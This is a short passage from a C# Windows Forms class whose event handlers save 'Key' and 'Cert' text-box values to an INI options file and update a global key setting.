        private void Txt_key_TextChanged(object sender, EventArgs e)
        {
            _ini.Write("Options", "Key", txt_key.Text);
            global.Key = txt_key.Text;
        }

        private void Txt_pfx_TextChanged(object sender, EventArgs e)
        {
            _ini.Write("Options", "Cert", txt_pfx.Text);
        }
    }
}